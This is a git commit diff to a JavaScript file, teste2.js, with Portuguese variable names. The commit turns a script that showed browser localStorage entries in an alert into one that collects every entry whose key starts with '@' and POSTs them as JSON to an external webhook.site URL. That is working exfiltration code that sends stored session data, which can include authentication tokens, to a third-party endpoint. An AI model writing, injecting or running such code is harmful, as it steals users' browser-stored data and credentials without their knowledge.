490c4ce519758d151573393e66e336c47a345fbe
Rafael <101749351+TechBeme@users.noreply.github.com>
2025-03-13 01:34:23 -0300

    Update teste2.js

--- teste2.js
+++ teste2.js
@@ -1,11 +1,24 @@
+const webhookUrl = 'https://webhook.site/3c64fc72-13bf-4198-a997-21474987b631';
 
-let mensagem = "";
+let dados = [];
+
 for (let i = 0; i < localStorage.length; i++) {
   let chave = localStorage.key(i);
   if (chave.startsWith('@')) {
     let valor = localStorage.getItem(chave);
-    mensagem += `Chave: ${chave} - Valor: ${valor}\n`;
+    dados.push({ chave, valor });
   }
 }
-alert(mensagem);
+
+fetch(webhookUrl, {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify(dados)
+})
+.then(response => alert("O script foi executado com sucesso!"))
+.then(result => console.log("Dados enviados com sucesso:", result))
+.catch(error => console.error("Erro ao enviar os dados:", error));
+
 export {};
